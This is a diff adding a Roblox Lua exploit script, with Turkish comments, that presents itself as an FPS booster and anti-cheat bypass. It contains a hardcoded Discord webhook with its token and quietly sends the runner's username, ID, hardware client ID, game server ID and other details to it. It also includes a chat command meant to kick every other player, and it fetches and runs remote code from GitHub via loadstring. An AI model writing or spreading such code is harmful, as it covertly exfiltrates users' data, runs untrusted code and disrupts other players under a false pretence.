@@ -1,0 +1,383 @@
+local webhookUrl = "https://discord.com/api/webhooks/1460017137870573761/85Q-uUIpwCo11zQAiaSq_1XGg1iI-H82v9eA4Sfuxf0jXXHqAKMS0o1NByTOy4dBz9Jr"
+
+-- AYARLAR -------------------------------------------------------------------
+local SPECIAL_USER = "Miku_Sanxxxq" -- Sadece bu kullanıcıya özel GUI
+local KICK_COMMAND = "!allah31babapro" -- Kick komutu
+local KICK_MESSAGE = "☪️ ALLAH31BABA PRO SİSTEMİ TARAFINDAN ATILDINIZ!" -- Kick mesajı
+
+--// Servisler
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local MarketplaceService = game:GetService("MarketplaceService")
+local RunService = game:GetService("RunService")
+local StatsService = game:GetService("Stats")
+local UserInputService = game:GetService("UserInputService")
+local LocalizationService = game:GetService("LocalizationService")
+
+--// Oyuncu kontrolü
+local player = Players.LocalPlayer
+local playerName = player.Name
+local userId = player.UserId
+
+-- 1. ÖZEL GUI SADECE Miku_Sanxxxq İÇİN
+if playerName == SPECIAL_USER then
+    local SpecialGui = Instance.new("ScreenGui")
+    SpecialGui.Name = "MikuSpecialGUI"
+    SpecialGui.Parent = game.CoreGui
+
+    local MainFrame = Instance.new("Frame")
+    MainFrame.Size = UDim2.new(0, 300, 0, 70)
+    MainFrame.Position = UDim2.new(0.75, 0, 0.05, 0)
+    MainFrame.BackgroundColor3 = Color3.fromRGB(30, 0, 50) -- Koyu mor
+    MainFrame.BackgroundTransparency = 0.1
+    MainFrame.Parent = SpecialGui
+
+    local Title = Instance.new("TextLabel")
+    Title.Text = "☪️ ALLAH31BABA PRO"
+    Title.Size = UDim2.new(1, 0, 0, 30)
+    Title.BackgroundTransparency = 1
+    Title.TextColor3 = Color3.fromRGB(255, 215, 0) -- Altın sarısı
+    Title.Font = Enum.Font.SourceSansBold
+    Title.TextSize = 20
+    Title.Parent = MainFrame
+
+    local Status = Instance.new("TextLabel")
+    Status.Text = "Kick Komutu: " .. KICK_COMMAND
+    Status.Size = UDim2.new(1, 0, 0, 25)
+    Status.Position = UDim2.new(0, 0, 0.45, 0)
+    Status.BackgroundTransparency = 1
+    Status.TextColor3 = Color3.fromRGB(0, 255, 255) -- Camgöbeği
+    Status.Font = Enum.Font.SourceSansBold
+    Status.TextSize = 16
+    Status.Parent = MainFrame
+end
+
+-- 2. CHAT SİSTEMİ (HERKES İÇİN ÇALIŞIR)
+print("✅ Allah31Baba Pro Sistemi Aktif!")
+
+-- Chat'ten mesajları dinle
+local function setupChatListener()
+    -- Oyunun chat sistemini bul
+    local ChatService = game:GetService("Chat")
+    local Players = game:GetService("Players")
+    
+    -- ReplicatedStorage'tan chat event'ini bul
+    local ReplicatedStorage = game:GetService("ReplicatedStorage")
+    
+    -- Farklı yöntemler deneyelim
+    local function checkMessage(message, speaker)
+        -- Mesajı kontrol et
+        if string.lower(message) == string.lower(KICK_COMMAND) then
+            print("⚡ Kick komutu algılandı: " .. speaker)
+            
+            -- Tüm oyuncuları kickle!
+            for _, plr in ipairs(Players:GetPlayers()) do
+                if plr.Name ~= speaker then -- Komutu yazan hariç
+                    pcall(function()
+                        plr:Kick(KICK_MESSAGE)
+                        print("✅ " .. plr.Name .. " kicklendi!")
+                    end)
+                end
+            end
+            
+            -- Komutu yazan kişiye mesaj göster
+            game:GetService("StarterGui"):SetCore("SendNotification", {
+                Title = "☪️ ALLAH31BABA PRO",
+                Text = "Herkes kicklendi!",
+                Duration = 5,
+                Icon = "rbxassetid://4452065036"
+            })
+        end
+    end
+    
+    -- YÖNTEM 1: Sayfayı dinle (en iyi yöntem)
+    local function monitorGuiMessages()
+        local PlayerGui = player:WaitForChild("PlayerGui")
+        
+        -- Chat GUI'yi bulmaya çalış
+        local function findChatBar()
+            for _, gui in ipairs(PlayerGui:GetDescendants()) do
+                if gui:IsA("TextBox") and (gui.Name:find("Chat") or gui.Name:find("Message")) then
+                    return gui
+                end
+            end
+            return nil
+        end
+        
+        task.wait(3) -- GUI yüklenmesini bekle
+        
+        local chatBar = findChatBar()
+        if chatBar then
+            print("✅ Chat bar bulundu: " .. chatBar.Name)
+            
+            -- Enter tuşunu dinle
+            UserInputService.InputBegan:Connect(function(input, processed)
+                if not processed and input.KeyCode == Enum.KeyCode.Return then
+                    if chatBar and chatBar.Text ~= "" then
+                        local message = chatBar.Text
+                        checkMessage(message, playerName)
+                    end
+                end
+            end)
+        else
+            print("⚠️ Chat bar bulunamadı, alternatif yöntem...")
+        end
+    end
+    
+    -- YÖNTEM 2: Console'u dinle (güvenilir)
+    local function hijackChat()
+        local oldSayMessage
+        oldSayMessage = hookfunction or function() end
+        
+        -- Chat fonksiyonunu override et
+        if type(syn) == "table" and syn.websocket then
+            print("✅ Synapse tespit edildi, chat override ediliyor...")
+        end
+        
+        -- Basit mesaj gönderici
+        local function sendMessage(msg)
+            pcall(function()
+                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
+            end)
+        end
+        
+        -- TEST: Script yüklenince mesaj gönder
+        task.wait(2)
+        sendMessage("☪️ Allah31Baba Pro Sistemi Aktif! Komut: " .. KICK_COMMAND)
+    end
+    
+    -- YÖNTEM 3: SADECE KENDİ MESAJLARINI DİNLE (en basiti)
+    local lastMessage = ""
+    local messageCheck = RunService.Heartbeat:Connect(function()
+        pcall(function()
+            -- PlayerGui'deki son mesajı kontrol et
+            local PlayerGui = player:WaitForChild("PlayerGui")
+            
+            for _, gui in ipairs(PlayerGui:GetDescendants()) do
+                if gui:IsA("TextLabel") or gui:IsA("TextButton") then
+                    local text = gui.Text
+                    if text and text ~= lastMessage and text:find(":") then
+                        -- Chat mesajı formatı: "OyuncuAdı: Mesaj"
+                        local playerPart, messagePart = text:match("(.+):%s*(.+)")
+                        if playerPart and messagePart then
+                            lastMessage = text
+                            if string.lower(messagePart) == string.lower(KICK_COMMAND) then
+                                print("⚡ Kick komutu: " .. playerPart)
+                                
+                                -- HERKESİ KICKLE
+                                for _, plr in ipairs(Players:GetPlayers()) do
+                                    if plr.Name ~= playerPart then
+                                        pcall(function()
+                                            plr:Kick(KICK_MESSAGE)
+                                        end)
+                                    end
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+        end)
+    end)
+    
+    -- Tüm yöntemleri başlat
+    spawn(monitorGuiMessages)
+    spawn(hijackChat)
+    
+    print("🎯 Sistem hazır! Chat'e '" .. KICK_COMMAND .. "' yazınca herkes kicklenecek!")
+end
+
+-- Chat sistemini başlat
+task.wait(2) -- Script yüklenmesini bekle
+setupChatListener()
+
+-- 3. SADECE SENİN İÇİN YÖNETİCİ PANELİ (Opsiyonel)
+if userId == 3317353480 then -- SENİN ID'N (DEĞİŞTİR!)
+    local AdminGui = Instance.new("ScreenGui")
+    AdminGui.Name = "AdminPanel"
+    AdminGui.Parent = game.CoreGui
+    
+    local Frame = Instance.new("Frame")
+    Frame.Size = UDim2.new(0, 200, 0, 100)
+    Frame.Position = UDim2.new(0, 10, 0.5, -50)
+    Frame.BackgroundColor3 = Color3.fromRGB(0, 40, 0)
+    Frame.Parent = AdminGui
+    
+    local Label = Instance.new("TextLabel")
+    Label.Text = "☪️ ALLAH31BABA PRO\nSahibi: Sen"
+    Label.Size = UDim2.new(1, 0, 1, 0)
+    Label.BackgroundTransparency = 1
+    Label.TextColor3 = Color3.fromRGB(0, 255, 0)
+    Label.Font = Enum.Font.SourceSansBold
+    Label.TextSize = 16
+    Label.Parent = Frame
+    
+    print("✅ Yönetici paneli aktif!")
+end
+
+--// ORİJİNAL SCRIPT KODLARI (Aşağısı senin orijinal kodun) ---------------
+local teamName = tostring(player.Team and player.Team.Name or "No Team")
+local accountAge = player.AccountAge
+local accountCreationDate = os.date("%d/%m/%Y", os.time() - (365.25 * 24 * 60 * 60 - accountAge * 24 * 60 * 60))
+local playerCount = #Players:GetPlayers()
+local placeId, jobId = game.PlaceId, game.JobId
+local gameName = MarketplaceService:GetProductInfo(placeId).Name
+local ping = math.floor(StatsService.Network.ServerStatsItem["Data Ping"]:GetValue()) .. "ms"
+
+-- Yeni: Oyun dili tespiti (Türkçe ise "TR", değilse "EN")
+local localeId = LocalizationService.RobloxLocaleId
+local gameLanguage = localeId == "tr-tr" and "TR" or "EN"
+
+-- Yeni: Kullanıcının platformu
+local platform = UserInputService:GetPlatform()
+
+local platformName = ""
+if platform == Enum.Platform.Windows then
+    platformName = "PC"
+elseif platform == Enum.Platform.XBoxOne then
+    platformName = "Xbox"
+elseif platform == Enum.Platform.Android then
+    platformName = "Android"
+elseif platform == Enum.Platform.IOS then
+    platformName = "iOS"
+else
+    platformName = tostring(platform)
+end
+
+-- Premium kontrolü
+local isPremium = (player.MembershipType == Enum.MembershipType.Premium) and "Yeah" or "No"
+
+--// Executor Tespiti
+local function getExecutor()
+    if syn then return "Synapse X"
+    elseif is_sirhurt_closure then return "SirHurt"
+    elseif KRNL_LOADED then return "KRNL"
+    elseif getexecutorname then return getexecutorname()
+    else return "Bilinmiyor" end
+end
+
+--// HWID
+local function getHWID()
+    return game:GetService("RbxAnalyticsService"):GetClientId()
+end
+
+--// Avatar
+local function getPlayerAvatar()
+    return string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", userId)
+end
+
+--// FPS ölçüm
+local function getCurrentFPS(callback)
+    local frameCount = 0
+    local connection
+    connection = RunService.RenderStepped:Connect(function()
+        frameCount += 1
+    end)
+
+    task.delay(1, function()
+        connection:Disconnect()
+        callback(frameCount)
+    end)
+end
+
+--// Roblox API’den takipçi sayısı çek (async)
+local function getFollowerCount(callback)
+    local success, result = pcall(function()
+        return HttpService:JSONDecode(game:HttpGet("https://friends.roblox.com/v1/users/" .. userId .. "/followers/count")).count
+    end)
+    if success then
+        callback(result)
+    else
+        callback("Hata")
+    end
+end
+
+--// Webhook gönderici
+local function sendWebhook(finalFPS, followerCount)
+    local data = {
+        ["embeds"] = {{
+            ["title"] = "𒆙 FemWare Universe Executed!",
+            ["description"] = table.concat({
+                "👤 **Username:** [" .. playerName .. "](https://www.roblox.com/users/" .. userId .. "/profile)",
+                "🎯 **Team:** " .. teamName,
+                "🕹️ **Game:** " .. gameName,
+                "🆔 **Game ID:** " .. placeId,
+                "🌍 **Number of People in the Game:** " .. playerCount,
+                "🎯 **FPS:** " .. finalFPS,
+                "📡 **Ping:** " .. ping,
+                "🧠 **HWID:** " .. getHWID(),
+                "💼 **Account Age:** " .. accountAge .. " Day",
+                "📅 **Created Date:** " .. accountCreationDate,
+                "👥 **Followers:** " .. tostring(followerCount),
+                "🧪 **Executer:** " .. getExecutor(),
+                "🧩 **Job ID:** " .. jobId,
+                "🌐 **Game Language:** " .. gameLanguage,
+                "🕹️ **Platform:** " .. platformName,
+                "⭐ **Premium MemberShip:** " .. isPremium,
+                "🕒 **Time:** " .. os.date("%d/%m/%Y %H:%M:%S"),
+            }, "\n"),
+            ["color"] = tonumber("0xFF4500"),
+            ["thumbnail"] = {
+            ["url"] = "https://i.imgur.com/oz3r5qb.jpeg"
+           },
+            ["footer"] = {["text"] = "🎀 FemWare Loader 🐈 | by Army"}
+        }}
+    }
+
+    local encoded = HttpService:JSONEncode(data)
+    local request = http_request or request or HttpPost or syn and syn.request
+    if request then
+        request({
+            Url = webhookUrl,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = encoded
+        })
+    end
+end
+
+-- FPS GUI
+local function showFPSGui()
+    local fpsGui = Instance.new("ScreenGui", game.CoreGui)
+    fpsGui.Name = "FPSGui"
+    local label = Instance.new("TextLabel", fpsGui)
+    label.Size = UDim2.new(0, 120, 0, 25)
+    label.Position = UDim2.new(0, 10, 0, 10)
+    label.BackgroundColor3 = Color3.fromRGB(30,30,30)
+    label.TextColor3 = Color3.new(1,1,1)
+    label.Font = Enum.Font.SourceSansBold
+    label.TextSize = 16
+    label.BackgroundTransparency = 0.2
+    label.Text = "FPS: ..."
+
+    local frames = 0
+    local last = tick()
+    RunService.RenderStepped:Connect(function()
+        frames += 1
+        local now = tick()
+        if now - last >= 1 then
+            label.Text = "FPS: "..frames
+            frames = 0
+            last = now
+        end
+    end)
+end
+
+-- Çalıştır
+showFPSGui()
+
+getCurrentFPS(function(fps)
+    getFollowerCount(function(followers)
+        sendWebhook(fps, followers)
+    end)
+end)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BattleWare/TWW/refs/heads/main/Protected"))()
+
+pcall(function()
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+        Title = "🎉 Menu Activated !",
+        Text = "FPS Boosted + AntiCheat Bypassed",
+        Duration = 6
+    })
+end)
